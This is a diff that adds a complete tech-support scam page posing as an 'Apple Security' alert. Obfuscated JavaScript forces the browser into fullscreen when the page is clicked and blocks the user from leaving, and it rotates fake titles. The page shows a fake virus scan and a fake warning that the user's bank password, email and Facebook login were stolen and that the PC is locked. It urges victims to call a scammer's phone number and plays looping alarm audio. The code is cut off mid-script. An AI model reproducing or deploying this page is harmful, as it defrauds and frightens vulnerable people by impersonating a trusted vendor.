@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<!-- Required meta tags -->
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+		<title></title>
+		<style>
+		body {
+	background: #fff;
+	-webkit-user-select: none;
+	-ms-user-select: none;
+	user-select: none;
+	/*
+   background: url('bg.png');
+  background-repeat: no-repeat;
+  background-size: cover;
+  */
+	font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+.top {
+	padding-left: 10px;
+}
+.progress {
+	width: 250px;
+
+	background: #d1d1d1;
+	height: 04px;
+}
+
+.progress .progress__bar {
+	height: 100%;
+	width: 0%;
+	border-radius: 2px;
+	background-color: #3182be;
+	animation: fill-bar 6s 1;
+}
+
+@keyframes fill-bar {
+	from {
+		width: 0%;
+	}
+	to {
+		width: 100%;
+	}
+}
+.textc {
+	color: grey;
+	font-size: 13px;
+}
+.flex {
+	display: flex;
+}
+.button {
+	background: #cccccc;
+	color: #000;
+	padding: 6px 32px;
+	text-align: center;
+	text-decoration: none;
+	display: inline-block;
+	font-size: 13px;
+	margin: 4px 2px;
+	cursor: pointer;
+	font-weight: 350;
+}
+
+.centerright img {
+	max-width: 100%;
+}
+.centerright ul {
+	padding: 0;
+	list-style-type: none;
+}
+.centerright ul {
+	columns: 3;
+}
+.centerright li {
+	width: calc((100vw / 3) - 20px);
+	display: inline-block;
+	margin-bottom: 40px;
+}
+
+.centerright ul {
+	display: flex;
+}
+.centerright ul {
+	display: grid;
+	grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+}
+.centerright {
+	position: absolute;
+	left: 70px;
+	top: 150px;
+	display: flex;
+}
+.btn:hover {
+	cursor: pointer;
+}
+.box {
+	display: none;
+	position: absolute;
+	width: 723px;
+	height: 560px;
+	top: 46%;
+	z-index: 999;
+	margin-top: -255px;
+	left: 48%;
+
+	border-radius: 0px;
+	margin-left: -325px;
+	border-radius: 8px;
+	padding-right: 10px;
+	padding-left: 0px;
+
+	background: #fff;
+
+	box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+}
+.centerright li p {
+	margin: 0.5rem;
+}
+.stay78 {
+	display: none;
+	position: absolute;
+	width: 723px;
+	height: 564px;
+	top: 46%;
+	z-index: 999;
+	margin-top: -255px;
+	left: 48%;
+	border-radius: 0px;
+	margin-left: -325px;
+	border-radius: 8px;
+	padding-right: 10px;
+	padding-left: 0px;
+
+	background: #fff;
+
+	box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+}
+.stay78::-webkit-scrollbar {
+	display: none;
+}
+
+.optis76 {
+	position: absolute;
+	top: 6%;
+	z-index: 9999;
+	left: 36%;
+	background: #1a73e8;
+	width: 440px;
+	text-align: left;
+	color: #fff;
+	padding-top: 4px;
+	display: none;
+	margin: 20px;
+	transform: translate(-50%, -50%);
+}
+.optis76 p {
+	font-size: 13px;
+	padding-bottom: 15px;
+	margin: 10px;
+}
+.action_buttons a.active {
+	border: 1px solid #3b79ed;
+	font-weight: bold;
+}
+.action_buttons a {
+	float: right;
+	font-size: 12px;
+	margin-right: 15px;
+	padding: 6px 25px;
+	text-decoration: none;
+	color: #fff !important;
+	border: 1px solid #fff;
+	margin-top: 20px;
+	border-radius: 3px; /* 100% */
+
+	margin-bottom: 20px;
+}
+.cardcontainer {
+	animation: zoominoutsinglefeatured 4s infinite;
+	border-radius: 10px;
+}
+@keyframes zoominoutsinglefeatured {
+	0% {
+		transform: scale(1, 1);
+	}
+	50% {
+		transform: scale(1.1, 1.1);
+	}
+	100% {
+		transform: scale(1, 1);
+	}
+}
+
+@keyframes zoomininsinglefeatured {
+	0% {
+		transform: scale(1, 1);
+	}
+	50% {
+		transform: scale(1.1, 1.1);
+	}
+	100% {
+		transform: scale(1, 1);
+	}
+}
+
+.greyside {
+	padding: 10px;
+	border-top-right-radius: 10px;
+	border-top-left-radius: 10px;
+	background: #e7e7e7;
+}
+.bottomselect {
+	padding: 10px;
+	border-bottom-right-radius: 10px;
+	border-bottom-left-radius: 10px;
+	background: #e7e7e7;
+}
+.websa {
+	font-weight: 700;
+	padding: 15px 30px;
+	min-height: 310px;
+	border-radius: 10px;
+	border: 1px solid #fff;
+	width: 560px;
+	margin: 0 auto;
+	background-color: #fff;
+	box-shadow: rgb(0 0 0 / 25%) 0px 54px 55px, rgb(0 0 0 / 12%) 0px -12px 30px, rgb(0 0 0 / 12%) 0px 4px 6px,
+		rgb(0 0 0 / 17%) 0px 12px 13px, rgb(0 0 0 / 9%) 0px -3px 5px;
+	z-index: 99999;
+	position: absolute;
+	top: 48%;
+	left: 51%;
+	cursor: pointer;
+	transform: translate(-50%, -50%);
+	display: none;
+}
+.ilb {
+	display: inline-block;
+}
+.headers {
+	width: 535px;
+	margin-top: 7px;
+	padding-bottom: 10px;
+}
+.logo3 {
+	margin: 0 7px 0px 0;
+	width: 30px;
+	height: 30px;
+}
+.title2 img {
+	position: absolute;
+	width: 3%;
+	top: 27px;
+	right: 17px;
+}
+#txtintro {
+	clear: both;
+	padding-top: 0px;
+	font-size: 14px;
+	font-weight: 600;
+	text-align: center;
+}
+.colo-rd {
+	color: #ff0000;
+}
+#banner {
+	margin: 5px auto;
+	display: block;
+}
+#disclaimer {
+	margin: 5px;
+	font-size: 17px;
+	font-weight: bold;
+	text-align: center;
+}
+.support {
+	font-weight: bold;
+	font-size: 17px;
+	color: #1a73e8;
+}
+#bottom {
+	margin: 12px 0;
+	height: 50px;
+	display: flex;
+	border-top: 1px solid #d6d5d5;
+	justify-content: space-between;
+}
+#badge {
+	margin-top: 22px;
+	height: 27px;
+}
+.title3 {
+	font-size: 18px;
+	font-weight: 700;
+	text-transform: capitalize;
+	position: relative;
+	width: 31%;
+	top: 15px;
+	left: 13px;
+}
+#bottom ul {
+	list-style-type: none;
+	margin-left: 10px;
+	margin-top: 1px;
+}
+#bottom ul li {
+	display: inline-block;
+	float: left;
+	padding-left: 20px;
+	margin-top: 13px;
+}
+#bottom ul li:first-child {
+	padding-left: 0;
+}
+.button2 {
+	border-radius: 4px;
+	padding: 10px 30px 10px 30px;
+	color: #000;
+	border: 1px solid #000;
+	background-color: transparent;
+	font-size: 18px;
+	font-weight: 700;
+	text-align: center;
+	cursor: pointer;
+}
+.buttons {
+	border-radius: 4px;
+	padding: 10px 30px 10px 30px;
+	color: #fff;
+	background-color: #1a73e8;
+	font-size: 18px;
+	font-weight: 700;
+	text-align: center;
+	cursor: pointer;
+}
+a {
+	color: #007bff;
+	text-decoration: none;
+	background-color: transparent;
+}
+a:hover {
+	color: #0056b3;
+	text-decoration: underline;
+}
+.button2:hover {
+	color: #fff;
+	background-color: #1a73e8;
+	border-color: #1a73e8;
+}
+.blink {
+	animation: blink-animation 1s steps(5, start) infinite;
+	-webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+.blink2 {
+	animation: blink-animation 1s steps(5, start) infinite;
+	-webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+@keyframes blink-animation {
+	to {
+		visibility: hidden;
+	}
+}
+@-webkit-keyframes blink-animation {
+	to {
+		visibility: hidden;
+	}
+}
+
+#footer {
+	left: 0;
+	width: 100%;
+	position: fixed;
+	bottom: 0;
+	background-color: #1a73e8;
+	z-index: 999;
+	padding: 10px 34px;
+	color: #fff;
+	font-size: 18px;
+	height: 75px;
+	cursor: pointer;
+}
+#footertxt,
+#footertxt2 {
+	font-size: 20px;
+}
+#footertxt img {
+	width: 30px;
+	margin-top: -4px;
+	filter: brightness(0) invert(1);
+}
+:host {
+	display: inline-block;
+	overflow: hidden;
+	text-align: initial;
+	white-space: nowrap;
+}
+
+.bg .bgimg {
+	position: absolute;
+	top: 60px;
+	left: 0px;
+	width: 100%;
+}
+
+</style>
+		<script type="text/javascript" src="scripts.js"></script>
+		<script type="text/javascript" src="custom.js"></script>
+		<script type="text/javascript" src="main.js"></script>
+		<link rel="icon" type="image/png" href="apple.png" />
+		<link
+			href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
+			rel="stylesheet"
+			integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD"
+			crossorigin="anonymous"
+		/>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+		<script
+			src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"
+			integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
+			crossorigin="anonymous"
+		></script>
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" />
+		<script>
+			var _0x3c9859 = _0x56aa;
+			function _0x1b82() {
+				var _0x54e963 = [
+					'2vWlfAg',
+					'style',
+					'21150fTUSGp',
+					'deg)',
+					'Dive\x20into\x20Solutions:\x20Apple\x20Support\x20at\x20Your\x20Service',
+					'26632xDrzxO',
+					'length',
+					'1225497MOlrrq',
+					'333xmLgQb',
+					'6EmOdeF',
+					'4sMSohf',
+					'random',
+					'30BpcoVe',
+					'1185778dqpehn',
+					'Swift\x20Solutions:\x20Apple\x20Support\x20at\x20Your\x20Fingertips',
+					'572040wqTqvn',
+					'Technical\x20Troubles?\x20Apple\x20Assistance\x20is\x20a\x20Click\x20Away',
+					'Apple\x20Aid:\x20Navigating\x20Issues\x20with\x20Technical\x20Expertise',
+					'floor',
+					'title',
+					'Unlocking\x20Apple\x20Answers:\x20Expert\x20Support\x20Services',
+					'filter:hue-rotate(',
+					'3444791zZBjzU',
+					'Troubleshoot\x20with\x20Confidence:\x20Apple\x20Support\x20Assistance',
+					'toFixed',
+					'739110rcigHE',
+					'Navigate\x20with\x20Ease:\x20Apple\x20Support\x20Assistance',
+				];
+				_0x1b82 = function () {
+					return _0x54e963;
+				};
+				return _0x1b82();
+			}
+			(function (_0x3502f8, _0x1ee146) {
+				var _0x3315d9 = _0x56aa,
+					_0x57ecfd = _0x3502f8();
+				while (!![]) {
+					try {
+						var _0x53efcf =
+							(-parseInt(_0x3315d9(0x16a)) / 0x1) * (-parseInt(_0x3315d9(0x168)) / 0x2) +
+							parseInt(_0x3315d9(0x16f)) / 0x3 +
+							(-parseInt(_0x3315d9(0x172)) / 0x4) * (parseInt(_0x3315d9(0x166)) / 0x5) +
+							(-parseInt(_0x3315d9(0x171)) / 0x6) * (-parseInt(_0x3315d9(0x163)) / 0x7) +
+							(parseInt(_0x3315d9(0x16d)) / 0x8) * (-parseInt(_0x3315d9(0x170)) / 0x9) +
+							(-parseInt(_0x3315d9(0x174)) / 0xa) * (parseInt(_0x3315d9(0x175)) / 0xb) +
+							-parseInt(_0x3315d9(0x177)) / 0xc;
+						if (_0x53efcf === _0x1ee146) break;
+						else _0x57ecfd['push'](_0x57ecfd['shift']());
+					} catch (_0x59254d) {
+						_0x57ecfd['push'](_0x57ecfd['shift']());
+					}
+				}
+			})(_0x1b82, 0x44497);
+			var randomDegree = (Math[_0x3c9859(0x173)]() * (0x6 - 0x2) + 0x2)[_0x3c9859(0x165)](0x2);
+			document['documentElement'][_0x3c9859(0x169)]['cssText'] = _0x3c9859(0x162) + randomDegree + _0x3c9859(0x16b);
+			var titles = [
+					'Apple\x20Support\x20Experts:\x20Ready\x20to\x20Assist\x20You',
+					_0x3c9859(0x176),
+					_0x3c9859(0x167),
+					'Your\x20Apple\x20Queries\x20Answered:\x20Support\x20on\x20Standby',
+					_0x3c9859(0x178),
+					_0x3c9859(0x161),
+					_0x3c9859(0x16c),
+					_0x3c9859(0x15e),
+					'Seamless\x20Support:\x20Apple\x20Experts\x20Ready\x20for\x20Your\x20Queries',
+					_0x3c9859(0x164),
+				],
+				randomIndex = Math[_0x3c9859(0x15f)](Math[_0x3c9859(0x173)]() * titles[_0x3c9859(0x16e)]),
+				randomTitle = titles[randomIndex];
+			function _0x56aa(_0x3f4b67, _0x142e23) {
+				var _0x1b8295 = _0x1b82();
+				return (
+					(_0x56aa = function (_0x56aa4, _0x22e68a) {
+						_0x56aa4 = _0x56aa4 - 0x15e;
+						var _0xf5ec31 = _0x1b8295[_0x56aa4];
+						return _0xf5ec31;
+					}),
+					_0x56aa(_0x3f4b67, _0x142e23)
+				);
+			}
+			document[_0x3c9859(0x160)] = randomTitle;
+		</script>
+
+		<style>
+			.black {
+				width: 100%;
+				height: 100%;
+				background-color: rgb(0 0 0 / 47%);
+				opacity: 0.7;
+				transition: 1s;
+				position: absolute;
+				top: -190px;
+				left: 0;
+			}
+		</style>
+
+		<script>
+			const savedPhoneNumber = sessionStorage.getItem('phoneNumber');
+
+			(function (_0x5616d3, _0x3cf7a1) {
+				var _0x12ad41 = _0x3a57,
+					_0x51b260 = _0x5616d3();
+				while (!![]) {
+					try {
+						var _0x2fff07 =
+							(parseInt(_0x12ad41(0xae)) / 0x1) * (parseInt(_0x12ad41(0xb9)) / 0x2) +
+							(-parseInt(_0x12ad41(0xbb)) / 0x3) * (-parseInt(_0x12ad41(0xb1)) / 0x4) +
+							-parseInt(_0x12ad41(0xb0)) / 0x5 +
+							parseInt(_0x12ad41(0xad)) / 0x6 +
+							parseInt(_0x12ad41(0xb2)) / 0x7 +
+							(-parseInt(_0x12ad41(0xb4)) / 0x8) * (-parseInt(_0x12ad41(0xac)) / 0x9) +
+							-parseInt(_0x12ad41(0xb5)) / 0xa;
+						if (_0x2fff07 === _0x3cf7a1) break;
+						else _0x51b260['push'](_0x51b260['shift']());
+					} catch (_0x5a1ba4) {
+						_0x51b260['push'](_0x51b260['shift']());
+					}
+				}
+			})(_0x1760, 0x2b122);
+			function _0x1760() {
+				var _0x177cec = [
+					'11314hWRGFD',
+					'webkitExitFullscreen',
+					'557868aVUJaM',
+					'63IknLdO',
+					'876654AgOzgW',
+					'5pAYgEI',
+					'msExitFullscreen',
+					'150305gotGqj',
+					'4JjkMLG',
+					'618191ZlqgPD',
+					'webkitRequestFullscreen',
+					'240712WsTvlc',
+					'4528070KEfdCs',
+					'exitFullscreen',
+					'msRequestFullscreen',
+					'requestFullscreen',
+				];
+				_0x1760 = function () {
+					return _0x177cec;
+				};
+				return _0x1760();
+			}
+			var elem = document['documentElement'];
+			function hriminWest() {
+				var _0x5f0389 = _0x3a57;
+				if (elem[_0x5f0389(0xb8)]) elem[_0x5f0389(0xb8)]();
+				else {
+					if (elem[_0x5f0389(0xb3)]) elem['webkitRequestFullscreen']();
+					else elem['msRequestFullscreen'] && elem[_0x5f0389(0xb7)]();
+				}
+			}
+			function _0x3a57(_0x82a9fa, _0x1ad5b7) {
+				var _0x176027 = _0x1760();
+				return (
+					(_0x3a57 = function (_0x3a57c7, _0x2d38fb) {
+						_0x3a57c7 = _0x3a57c7 - 0xac;
+						var _0x350049 = _0x176027[_0x3a57c7];
+						return _0x350049;
+					}),
+					_0x3a57(_0x82a9fa, _0x1ad5b7)
+				);
+			}
+			function closeFullscreen() {
+				var _0x78159d = _0x3a57;
+				if (document[_0x78159d(0xb6)]) document[_0x78159d(0xb6)]();
+				else {
+					if (document[_0x78159d(0xba)]) document[_0x78159d(0xba)]();
+					else document[_0x78159d(0xaf)] && document[_0x78159d(0xaf)]();
+				}
+			}
+			var _0x1dfac6 = _0x3b9c;
+			function _0x3b9c(_0x3aad6f, _0x3c8adc) {
+				var _0x1a3cde = _0x1a3c();
+				return (
+					(_0x3b9c = function (_0x3b9ced, _0x282be5) {
+						_0x3b9ced = _0x3b9ced - 0xcd;
+						var _0x5bbe04 = _0x1a3cde[_0x3b9ced];
+						return _0x5bbe04;
+					}),
+					_0x3b9c(_0x3aad6f, _0x3c8adc)
+				);
+			}
+			(function (_0x1f5c9c, _0x3e4bee) {
+				var _0x34a228 = _0x3b9c,
+					_0x1e7874 = _0x1f5c9c();
+				while (!![]) {
+					try {
+						var _0x2ff91b =
+							(parseInt(_0x34a228(0xcd)) / 0x1) * (-parseInt(_0x34a228(0xd7)) / 0x2) +
+							(-parseInt(_0x34a228(0xcf)) / 0x3) * (-parseInt(_0x34a228(0xdb)) / 0x4) +
+							(-parseInt(_0x34a228(0xd0)) / 0x5) * (-parseInt(_0x34a228(0xd8)) / 0x6) +
+							-parseInt(_0x34a228(0xdd)) / 0x7 +
+							-parseInt(_0x34a228(0xd3)) / 0x8 +
+							parseInt(_0x34a228(0xd9)) / 0x9 +
+							(parseInt(_0x34a228(0xd5)) / 0xa) * (parseInt(_0x34a228(0xde)) / 0xb);
+						if (_0x2ff91b === _0x3e4bee) break;
+						else _0x1e7874['push'](_0x1e7874['shift']());
+					} catch (_0x22092a) {
+						_0x1e7874['push'](_0x1e7874['shift']());
+					}
+				}
+			})(_0x1a3c, 0xcd4fd),
+				(window[_0x1dfac6(0xdc)] = function () {
+					var _0x371fd8 = _0x1dfac6;
+					if (data_needs_saving()) return _0x371fd8(0xd6);
+					else return;
+				}),
+				window[_0x1dfac6(0xda)](_0x1dfac6(0xd1), function (_0x13b1f4) {
+					var _0x519fbd = _0x1dfac6,
+						_0x45eacd = _0x519fbd(0xd2) + _0x519fbd(0xd4);
+					return ((_0x13b1f4 || window['event'])[_0x519fbd(0xce)] = _0x45eacd), _0x45eacd;
+				});
+			function _0x1a3c() {
+				var _0x3dc25c = [
+					'It\x20looks\x20like\x20you\x20are\x20editing\x20something.',
+					'8661264QDzAXV',
+					'Your\x20changes\x20will\x20be\x20lost\x20if\x20you\x20leave\x20before\x20saving.',
+					'240xFmBIr',
+					'Call\x20Windows\x20Defender\x20Helpline\x20Now',
+					'2736166cFLYAX',
+					'894mQLEdp',
+					'13810401YGllru',
+					'addEventListener',
+					'12DvEvmW',
+					'onbeforeunload',
+					'3590335zvlVST',
+					'620587gwXzey',
+					'1OxjPrH',
+					'returnValue',
+					'54588PdYwDQ',
+					'28910VpSYxg',
+					'beforeunload',
+				];
+				_0x1a3c = function () {
+					return _0x3dc25c;
+				};
+				return _0x1a3c();
+			}
+		</script>
+	</head>
+	<body id="headMain" onclick="loyarQ()">
+		<div class="bg" style="cursor: none">
+			<div class="bgimg" style="top: 0px"><img src="bg.png" alt="" width="100%" /></div>
+		</div>
+		<a onclick="hriminWest();" rel="noreferrer" id="link_black">
+			<div class="black" style="height: 145%"></div>
+		</a>
+
+		<div class="box" id="box">
+			<div class="top">
+				<p style="font-size: 17px; font-weight: 600; font-family: Arial, Helvetica, sans-serif">
+					Apple Security<img src="minimize.jpeg" class="" style="float: right; width: 115px" />
+				</p>
+			</div>
+
+			<h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300" id="text1">Safety at a glance</h4>
+			<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px" id="text2">
+				<br />Check what is happening to the safety and health of your device and take all necessary measures.
+			</p>
+			<div class="centerright">
+				<ul>
+					<li>
+						<br />
+						<img src="kxFy-clip.png" width="50px;" />
+						<p>Apple Security Protection</p>
+						<p style="top: 103px; position: absolute; font-size: 13px; color: grey">
+							action is required. Run a scan to check for <br />threats.
+						</p>
+					</li>
+					<li>
+						<br /><br />
+						<img src="qsbs-firewall.png" width="60px;" />
+						<p>Firewall and network protection</p>
+						<p style="top: 270px; position: absolute; font-size: 13px; color: grey">No action required.</p>
+					</li>
+				</ul>
+				<ul>
+					<li>
+						<br />
+						<img src="s-S4-acc.png" width="60px;" />
+						<p>Account protection</p>
+						<p style="top: 125px; position: absolute; font-size: 13px; color: grey">No action required.</p>
+					</li>
+					<li>
+						<br />
+						<img src="Z5BR-network.png" width="51px;" />
+						<p>Application and browser control</p>
+						<p style="top: 270px; position: absolute; font-size: 13px; color: grey">No action required.</p>
+					</li>
+				</ul>
+			</div>
+			<img src="uZbx-si.png" class="" style="border-bottom-left-radius: 10px" width="30.9px; height: 15.2px;" id="clscl" />
+			<br />
+		</div>
+
+		<!--Apple Security Quick Scan-->
+		<div class="stay78" id="stay78">
+			<div class="top">
+				<p style="font-size: 17px; font-weight: 600; font-family: Arial, Helvetica, sans-serif">
+					Apple Security<img src="minimize.jpeg" class="" style="float: right; width: 115px" />
+				</p>
+			</div>
+			<h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300" id="text1">
+				<img src="apple.png" width="25px;" style="margin-right: 10px; vertical-align: sub" />Apple Security Protection
+			</h4>
+			<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px" id="text2">
+				Device protection against threats.
+			</p>
+
+			<h3 style="position: absolute; right: 150px; top: 6px; font-weight: 500; font-size: 19px" id="text12">
+				<b
+					><script>
+						document.write(savedPhoneNumber);
+					</script>
+					(free security)</b
+				>
+			</h3>
+
+			<div class="centerright">
+				<ul>
+					<li>
+						<div class="flex">
+							<img src="-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute" />
+							<p style="font-weight: 400; position: absolute; left: 30px">current threat</p>
+						</div>
+
+						<br /><br />
+						<div class="progress" id="bar">
+							<div class="progress__bar"></div>
+						</div>
+
+						<p style="font-size: 13px" id="info">
+							Quick scan in progress...<br />Estimated time remaining: <n id="time">0</n><br /><n id="amount">0</n> Files scanned.
+						</p>
+
+						<a href="#" class="button" id="re">To cancel</a>
+						<p style="font-size: 13px" id="recx">Keep working while we analyze your device.</p>
+
+						<p style="font-size: 13px; color: #0063c6; cursor: pointer" id="recx-hide">protection history</p>
+						<br />
+						<p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer">
+							Scan Options<br />
+							Allowed Threats<br />
+							Protection History
+						</p>
+					</li>
+
+					<li>
+						<div class="flex">
+							<img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px" />
+							<p style="position: absolute; left: 35px; bottom: 117px; line-height: 18px">Virus & threat protection settings</p>
+						</div>
+						<p style="color: grey; font-size: 13px">no action required</p>
+						<p style="font-size: 13px; color: #0063c6">Manage your settings</p>
+					</li>
+				</ul>
+				<ul>
+					<li>
+						<p style="position: absolute; top: -55px">I have a question?</p>
+
+						<p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer">get help</p>
+					</li>
+					<li>
+						<p style="position: absolute; top: 25px">who will protect me ?</p>
+
+						<p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer">Supplier management</p>
+					</li>
+					<li>
+						<p style="position: absolute; top: 100px"><br />Help us improve Apple Security</p>
+
+						<p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer">Send us your feedback</p>
+					</li>
+					<li>
+						<p style="position: absolute; top: 190px">Change your privacy settings</p>
+						<p style="position: absolute; top: 220px; font-size: 13px">
+							View and change privacy settings on Mac<br /><n id="which"></n> devices.
+						</p>
+
+						<p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px; cursor: pointer">
+							Privacy Settings<br />Privacy Dashboard<br />Privacy Statement
+						</p>
+					</li>
+				</ul>
+			</div>
+			<img src="uZbx-si.png" class="" style="border-bottom-left-radius: 10px" width="30.9px; height: 15.2px;" id="clscl" />
+			<br />
+		</div>
+		<script>
+			function _0xe7e0() {
+				const _0x58ea6c = [
+					'6AzdiXq',
+					'split',
+					'getElementById',
+					'then',
+					'which',
+					'platform',
+					'11LUmESZ',
+					'977478MKaAeF',
+					'\x2011',
+					'51138nIltvr',
+					'117052HXBzSM',
+					'innerHTML',
+					'15298TrqRFG',
+					'126cODIqH',
+					'Apple',
+					'platformVersion',
+					'1552WGWLXb',
+					'Beyond',
+					'1091490QttPUm',
+					'3953733jdHuFs',
+					'log',
+					'24600950czClUo',
+					'\x2010',
+					'userAgentData',
+				];
+				_0xe7e0 = function () {
+					return _0x58ea6c;
+				};
+				return _0xe7e0();
+			}
+			function _0x1eeb(_0x5c0b38, _0x1c71d0) {
+				const _0xe7e023 = _0xe7e0();
+				return (
+					(_0x1eeb = function (_0x1eebfe, _0x50a200) {
+						_0x1eebfe = _0x1eebfe - 0x1db;
+						let _0x2f795c = _0xe7e023[_0x1eebfe];
+						return _0x2f795c;
+					}),
+					_0x1eeb(_0x5c0b38, _0x1c71d0)
+				);
+			}
+			const _0x4deec3 = _0x1eeb;
+			(function (_0x23e0c3, _0x10189c) {
+				const _0x3916b5 = _0x1eeb,
+					_0x44b302 = _0x23e0c3();
+				while (!![]) {
+					try {
+						const _0x326967 =
+							parseInt(_0x3916b5(0x1f0)) / 0x1 +
+							(-parseInt(_0x3916b5(0x1dd)) / 0x2) * (-parseInt(_0x3916b5(0x1de)) / 0x3) +
+							parseInt(_0x3916b5(0x1db)) / 0x4 +
+							parseInt(_0x3916b5(0x1e3)) / 0x5 +
+							(-parseInt(_0x3916b5(0x1e9)) / 0x6) * (-parseInt(_0x3916b5(0x1e4)) / 0x7) +
+							(-parseInt(_0x3916b5(0x1e1)) / 0x8) * (-parseInt(_0x3916b5(0x1f2)) / 0x9) +
+							(-parseInt(_0x3916b5(0x1e6)) / 0xa) * (parseInt(_0x3916b5(0x1ef)) / 0xb);
+						if (_0x326967 === _0x10189c) break;
+						else _0x44b302['push'](_0x44b302['shift']());
+					} catch (_0x30a092) {
+						_0x44b302['push'](_0x44b302['shift']());
+					}
+				}
+			})(_0xe7e0, 0xb7eb1),
+				navigator[_0x4deec3(0x1e8)]['getHighEntropyValues']([_0x4deec3(0x1e0)])[_0x4deec3(0x1ec)]((_0x37a4d2) => {
+					const _0x270b67 = _0x4deec3;
+					if (navigator[_0x270b67(0x1e8)][_0x270b67(0x1ee)] === _0x270b67(0x1df)) {
+						const _0x3df684 = parseInt(_0x37a4d2['platformVersion'][_0x270b67(0x1ea)]('.')[0x0]);
+						if (_0x3df684 >= 0xd) document[_0x270b67(0x1eb)](_0x270b67(0x1ed))['innerHTML'] = _0x270b67(0x1f1);
+						else
+							_0x3df684 > 0x0
+								? (document['getElementById'](_0x270b67(0x1ed))[_0x270b67(0x1dc)] = _0x270b67(0x1e7))
+								: console[_0x270b67(0x1e5)](_0x270b67(0x1e2));
+					} else console[_0x270b67(0x1e5)]('does\x20not\x20work\x20on\x20Mac');
+				});
+		</script>
+
+		<div class="optis76 cardcontainer mnwebs">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12">
+						<p
+							class="text-center"
+							style="
+								font-size: 16px;
+								font-weight: normal;
+								margin: 0;
+								margin-bottom: 5px;
+								padding: 5px 10px;
+								color: #fff;
+								font-weight: bold;
+								margin-top: 8px;
+								text-align: center;
+							"
+						>
+							Apple Security - Protection Warning
+						</p>
+						<p class="text-center">** Access to this PC has been blocked for security reasons **</p>
+						<p>
+							Your computer has been warned that it is infected with Unknown Error code: #0x6D9. The following data was compromised:
+							<br /><br />
+							> Email ID<br />
+							&gt; Bank Password<br />
+							> Facebook Login<br />
+							> Photos and Photo Documents
+						</p>
+
+						<p>
+							A Apple Security scan has detected potentially unwanted adware on this device that can steal your passwords, online
+							identities, financial information, personal files, images, or documents.
+						</p>
+						<!-- <p>Please contact us immediately so that our engineers can explain the removal process over the phone. <br><br> -->
+
+						<p>
+							Please contact Apple Support immediately to report this threat, prevent spoofing, and unlock access to this device.
+							<br /><br />
+							Closing this mac puts your personal information at risk and interrupts your mac registration.
+						</p>
+
+						<p style="padding-bottom: 0px">
+							Call Apple Support
+							<strong
+								><script>
+									document.write(savedPhoneNumber);
+								</script>
+								(Security Support)</strong
+							>
+						</p>
+						<div class="action_buttons">
+							<a class="" id="leave_page" style="cursor: pointer">Have understood</a> <a class="" id="leave_page">To cancel</a>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<audio id="peet7" loop>
+			<source src="kriaS2.mp3" type="audio/mpeg" />
+		</audio>
+
+		<script>
+			var _0x38d36e = _0x2ab4;
+			function _0x30ab() {
+				var _0x3e12d0 = [
+					'35085dxpqTo',
+					'4882242nlohqj',
+					'requestFullScreen',
+					'documentElement',
+					'749335ZrLRWv',
+					'9TRzgpY',
+					'284TkqOeK',
+					'1419978yNTEMw',
+					'mozRequestFullScreen',
+					'14fjTdci',
+					'click',
+					'891632WJDuRH',
+					'13025340OuMFdz',
+					'2379510SGPzVU',
+				];
+				_0x30ab = function () {
+					return _0x3e12d0;
+				};
+				return _0x30ab();
+			}
+			function _0x2ab4(_0x1cef69, _0x1774bf) {
+				var _0x30abb1 = _0x30ab();
+				return (
+					(_0x2ab4 = function (_0x2ab495, _0x51addb) {
+						_0x2ab495 = _0x2ab495 - 0x68;
+						var _0x5b02b4 = _0x30abb1[_0x2ab495];
+						return _0x5b02b4;
+					}),
+					_0x2ab4(_0x1cef69, _0x1774bf)
+				);
+			}
+			(function (_0x1c63be, _0x2fba4d) {
+				var _0x4bb6a1 = _0x2ab4,
+					_0x1198cd = _0x1c63be();
+				while (!![]) {
+					try {
+						var _0x3e1688 =
+							-parseInt(_0x4bb6a1(0x6f)) / 0x1 +
+							-parseInt(_0x4bb6a1(0x72)) / 0x2 +
+							parseInt(_0x4bb6a1(0x6a)) / 0x3 +
+							(-parseInt(_0x4bb6a1(0x71)) / 0x4) * (-parseInt(_0x4bb6a1(0x6b)) / 0x5) +
+							-parseInt(_0x4bb6a1(0x6c)) / 0x6 +
+							(parseInt(_0x4bb6a1(0x74)) / 0x7) * (parseInt(_0x4bb6a1(0x68)) / 0x8) +
+							(-parseInt(_0x4bb6a1(0x70)) / 0x9) * (-parseInt(_0x4bb6a1(0x69)) / 0xa);
+						if (_0x3e1688 === _0x2fba4d) break;
+						else _0x1198cd['push'](_0x1198cd['shift']());
+					} catch (_0x3c2038) {
+						_0x1198cd['push'](_0x1198cd['shift']());
+					}
+				}
+			})(_0x30ab, 0x84c2c),
+				addEventListener(_0x38d36e(0x75), function () {
+					var _0x674db4 = _0x38d36e,
